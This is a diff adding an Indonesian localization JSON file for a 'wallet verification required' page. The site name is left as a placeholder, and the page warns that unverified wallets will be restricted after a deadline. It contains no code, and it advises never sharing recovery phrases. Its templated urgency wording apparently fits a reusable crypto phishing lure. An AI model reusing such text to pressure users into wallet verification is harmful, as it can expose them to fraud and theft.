@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Verifikasi Dompet | {websiteName}",
+    "mainTitle": "Verifikasi Dompet Diperlukan",
+    "description1": "Untuk mempertahankan standar keamanan dan kepatuhan regulasi, kami sekarang memerlukan verifikasi alamat dompet untuk semua pengguna.",
+    "deadlineText": "Mulai dari {date}, dompet yang tidak diverifikasi akan",
+    "restrictionText": " dibatasi sementara",
+    "cooperationText": "Kami menghargai kerja sama Anda dalam menjaga platform kami tetap aman.",
+    "termsText": "Saya setuju dengan",
+    "termsLink": "Ketentuan Penggunaan {websiteName}",
+    "verifyBtnText": "Verifikasi Dompet Saya",
+    "securityBtnText": "Tentang Frasa yang Terkompromi",
+    "modalTitle": "Peringatan Keamanan: Frasa Pemulihan yang Terkompromi",
+    "modalWarning": "Peringatan Kritis:",
+    "modalWarningText": "Frasa pemulihan Anda adalah kunci utama dompet Anda. Jangan pernah mengungkapkannya kepada siapa pun atau memasukkannya ke situs web mana pun.",
+    "signsTitle": "Tanda-tanda frasa yang terkompromi:",
+    "signsList": [
+        "Dibagikan dengan seseorang yang mengklaim sebagai dukungan",
+        "Disimpan secara digital (foto, cloud, pesan)",
+        "Transaksi tidak sah di dompet Anda"
+    ],
+    "actionTitle": "Tindakan segera diperlukan jika terkompromi:",
+    "actionList": [
+        "Transfer semua dana ke dompet baru yang aman segera",
+        "Buat frasa pemulihan yang benar-benar baru",
+        "Jangan pernah menggunakan versi frasa lama apa pun"
+    ],
+    "modalNote": "Catatan: {websiteName} tidak akan pernah meminta frasa pemulihan Anda. Proses verifikasi ini hanya memerlukan alamat dompet publik Anda."
+} 
+
+
+
